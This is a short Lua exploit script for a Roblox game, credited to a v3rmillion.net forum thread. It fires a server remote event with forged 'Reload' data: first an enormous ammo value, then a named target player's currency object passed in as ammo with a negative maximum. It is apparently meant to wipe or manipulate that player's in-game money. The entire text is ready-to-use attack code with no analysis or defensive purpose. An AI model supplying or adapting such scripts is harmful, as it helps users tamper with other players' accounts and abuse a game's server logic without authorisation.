-- ORIGINAL SCRIPT // https://v3rmillion.net/showthread.php?tid=1165198 \\

local target = "target name here"

game.ReplicatedStorage:FindFirstChild(".gg/untitledhood"):FireServer(
   "Reload",
   {
       Name = "[Revolver]",
       Ammo = {Value = math.huge*9e9},
       MaxAmmo = {Value = 0}
   }
)

task.wait(2)

game.ReplicatedStorage:FindFirstChild(".gg/untitledhood"):FireServer(
   "Reload",
   {
        Name = "[Revolver]",
        Ammo = game:GetService("Players")[target].DataFolder.Currency,
        MaxAmmo = {Value = -69}
   }
)
